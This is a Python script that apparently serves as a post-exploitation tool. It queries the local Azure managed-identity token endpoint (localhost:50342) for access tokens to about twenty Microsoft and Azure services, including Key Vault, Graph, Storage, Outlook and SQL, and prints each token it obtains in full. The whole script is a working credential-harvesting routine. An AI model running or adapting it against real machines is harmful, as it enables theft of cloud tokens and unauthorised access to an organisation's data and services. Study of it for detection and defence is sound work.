#!/usr/bin/python3
import requests
import json
count = 0
access_tokens = {}
endpoints = [
        'https://management.core.windows.net/',
        'https://management.azure.com/',
        'https://graph.windows.net/',
        'https://vault.azure.net',
        'https://datalake.azure.net/',
        'https://outlook.office365.com/',
        'https://graph.microsoft.com/',
        'https://batch.core.windows.net/',
        'https://analysis.windows.net/powerbi/api',
        'https://storage.azure.com/',
        'https://rest.media.azure.net',
        'https://api.loganalytics.io',
        'https://ossrdbms-aad.database.windows.net',
        'https://www.yammer.com',
        'https://digitaltwins.azure.net',
        '0b07f429-9f4b-4714-9392-cc5e8e80c8b0',
        '822c8694-ad95-4735-9c55-256f7db2f9b4',
        'https://dev.azuresynapse.net',
        'https://database.windows.net',
        'https://quantum.microsoft.com',
        'https://iothubs.azure.net',
]
print (f'[ * ] Attempting to obtain resource tokens for {str(len(endpoints))} endpoints')
for resource in endpoints:
        url = "http://localhost:50342/oauth2/token"
        data = {'resource': resource}
        headers = {'Content-Type':'application/x-www-form-urlencoded', 'Metadata':'true'}
        r = requests.post(url, headers=headers, data=data)
        try:
                data = r.json()
                if data['access_token']:
                        access_tokens[resource] = data['access_token']
                        print (f'[ + ] Access Token Obtained For: {resource}')
                        count += 1
        except Exception as e:
                print (f'[ ! ] ERROR: {e}')
                print (f'[ ! ] Actual Respones: \r\n\r\n{r.text}\r\n\r\n')
print ('[ * ] Finished Requesting Tokens...')
print (f'[ + ] Analytics:')
print (f'[ + ] Total Number of tokens obtains: {str(count)}')
print (f'[ + ] Tokens obtained for the following resources:')
for k,v in access_tokens.items():
        print (f'    [ * ] {v}')
print (f'[ + ] FIN!')
